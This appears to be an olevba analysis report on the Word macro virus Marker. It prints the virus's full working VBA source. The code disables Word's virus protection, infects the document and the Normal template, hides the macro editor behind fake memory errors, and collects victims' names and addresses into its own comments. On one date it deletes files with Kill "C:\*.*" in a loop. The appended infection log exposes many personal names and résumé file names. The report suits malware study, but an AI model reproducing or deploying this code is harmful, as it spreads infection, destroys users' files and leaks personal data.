olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-de8b22e23c6ed837becc38f70c19ec291fd911ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-de8b22e23c6ed837becc38f70c19ec291fd911ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Private Sub Document_Close()
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim ad, nt As Object
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim rep, x As Integer
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dim virusCode, UserAddress, LogData, LogFile As String
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.VirusProtection = False
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = True
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Delivery:
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Day(Now()) = 22 And Month(Now()) = 2 Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Kill "C:\*.*":
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
GoTo Delivery
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If DocumentInfected = True Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveNormalTemplate = NormalTemplate.Saved
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For I = 1 To Len(Application.UserAddress)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Else
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
UserAddress = UserAddress & Chr(13) & "' "
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next I
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = virusCode & LogData
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With nt.codemodule
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveNormalTemplate = True Then NormalTemplate.Save
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If NormalTemplateInfected = True Then
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
SaveDocument = ActiveDocument.Saved
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.AddFromString virusCode
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
nt.codemodule.AddFromString virusCode
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ad.codemodule.Deletelines 174, 13
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With ad.codemodule
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 45 To 181 Step 2
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
If SaveDocument = True Then ActiveDocument.Save
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End If
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Options.SaveNormalPrompt = False
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub viewVBcode()
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ToolsMacro()
' Andreas Marx Doc4.doc20.07.01 08:42:02HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
x = MsgBox(" Error - Not enough memory!", vbOKOnly + VbApplication + vbCritical, "Visual Basic Editor")

End Sub
' Virus Lab Document18/3/99 7:43:09 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1
' Microsoft Select Agreement Recs_Y2kCPTemplateV5.doc26/07/99 16:44:48ST Level 10 on \\LON209\HPST1027
' Virus Lab Document18/3/99 7:43:09 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1
' Microsoft Select Agreement Recs_Y2kCPTemplateV5.doc26/07/99 16:44:48ST Level 10 on \\LON209\HPST1027
' Virus Lab Document18/3/99 7:43:09 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1
' Valued Gateway Customer
' Virus Lab Document18/3/99 7:43:09 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1
' New Microsoft Word Document2.doc

' special.doc

' 03:36:03 PM -Friday,14 May,1999
' Matthew E. Dawson
'
' special.doc

' cover.doc

' Document1

' div.doc

' This is it.doc

' Resume.doc

' Resume.doc

' AT.doc

' Document1

' Document1

' AT.DOC

' Proposal.doc

' Document1

' Document1

' Document1

' details.doc

' Resume.doc

' div.doc

' 05:08:00 PM -Monday,24 May,1999
' Siu Pang
'
' div.doc

' beatrix_kwan.doc

' slee.doc

' CV981125.doc

' MassoudW97.doc

' S4R_Int.doc

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' HOTLIST1.doc

' Toshinobu SHIIKI.doc

' Jacob Jacobs.doc

' cv_focus.doc

' letter2.doc

' Hot List 05-27-1999.doc

' Ashwat.doc

' dbaunix.doc

' juno.doc

' CVMBA.doc

' RESUME399.doc

' Alex Lam.doc

' Senior Unix Administrator.doc

' Senior Unix Administrator.doc

' RESUME LATEST11.doc

' Ryuji Iwamoto1.doc

' Document1

' Sivaram Venkata1.doc

' Dean's Resume Current.doc

' infrmgr.doc

' Alan LEE.doc

' Jackson YAU.doc

' Patrickshum.doc

' Resume.doc

' CurrVit (1).doc

' SaleTar.doc

' Gerald Sanderson.doc

' Lee-A.doc

' carmel~1.doc

' 990116.res-detail-ltt.doc

' resume.doc

' Ad tech supp.doc

' Interview Discussion Items.doc

' Rres97j.doc

' Cvrltra.doc

' HOTLIST1.doc

' Mar-W.doc

' thomas chu.doc

' 2952.doc

' China.doc

' CIIC Introduction.doc

' Carlos Junco Jr.doc

' Vinod Varkey.doc

' Brian Voorman.doc

' Deon Victoria Allen.doc

' Junco-C.doc

' charlie_cv.doc

' ANIL Antony, Lotus Notes.doc

' Gary TANG.doc

' marcus chan.doc

' Web Operations Admin.doc

' Mac Coordinator.doc

' ANIL Antony, Lotus Notes1.doc

' CV ROGER CORPIN.doc

' Resume1.doc

' Jackson Yau 2.doc

' S4R_Int.doc

' asset management2.doc

' FID Developer.doc

' Equity Front line.doc

' Prof.doc

' TK Business Manager.doc

' recruiter.doc

' 5011.doc

' Aude HENNINO.doc

' HOTLIST.doc

' MATCHCOM.doc

' newresume.doc

' Tokyo IT Business Manager 21Jun.doc

' 09:33:18 AM -Wednesday,23 Jun,1999
' PricewaterhouseCoopers
'
' Tokyo job1.doc

' CPJP Trading v1.5.doc

' CPSY Settlement v1.3.doc

' CPHK Settlement v1.9.doc

' Trd040e1.doc

' Trd040e2.doc

' CPHK Trading v2.0.doc

' CP1-TS-V2.0.doc

' CPJP Settlement v1.5.doc

' CPJP Settlement v1.4.doc

' CP1-TS-V2.0.doc

' Performance Appraisal 1999.doc

' GS appraisal_TC.doc

' Process Mapping standards.doc

' Process Mapping standards.doc

' CPHK Settlement v2.2.doc

' CPHK Settlement v2.2.doc

' Y2kCPTemplateV4.doc

' Y2kCPTemplateV3.doc

' CPHK Trading v2.1.doc

' Document in Microsoft Internet Explorer

' Status report 2-7-99.doc

' CPJP Trading v1.6.doc

' CPHK Trading v2.2.doc

' Proc SG v1.0.doc

' Ltr to James Oliver.doc

' CPHK Trading v2.3.doc

' 06:45:26  -Monday,12 Jul,1999
' Microsoft Select Agreement
'
' CPHK Trading v2.6.doc

' Library.doc

' Overall control sheet 9-7-99.doc

' Maintenance of the contingency plan.doc

' InfoPack for Paul Betts.doc

' Y2kCP FE Trade DeskV5.doc

' Status report 9-7-99.doc

' Y2kCPTemplateV5_BP.doc

' Y2kCP FE Trade DeskV5.doc

' PROGRESS CONFERENCE MEETING 6.7.99.doc

' CPHK Settlement v2.5.doc

' Status report 9-7-99.doc

' Library.doc

' Outstanding issues.doc

' DA1015.doc

' contact details.doc

' Business Continuity Plan Review2.doc

' Terms of reference.doc

' Signoff sheet.doc

' Status report 9-7-99.doc

' Status report 16-7-99.doc

' Instinet Holiday Notes.doc

' Scope of Year 2000 Business Continuity Plan.doc

' software check.doc

' PROGRESS CONFERENCE MEETING 13.7.99.doc

' UK & US Settlements - Final v1.1.doc

' 0722InstinetNews.doc

' Rationale.doc

' Discussion points for Bill Irving.doc

' UK & US Settlements - Final v1.1.doc

' Changes 21 July.doc

' Y2kCPCustomers Services 6 using TemplateV4.doc

' Recs_Y2kCPTemplateV5.doc

' 07:40:32 PM -Tuesday,3 Aug,1999
' Virus Lab
'
' recs.doc

' recs8735.doc

' Document1

' 08:42:02  -Freitag,20 Jul,2001
' Andreas Marx
'
' Doc4.doc

' dok1.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
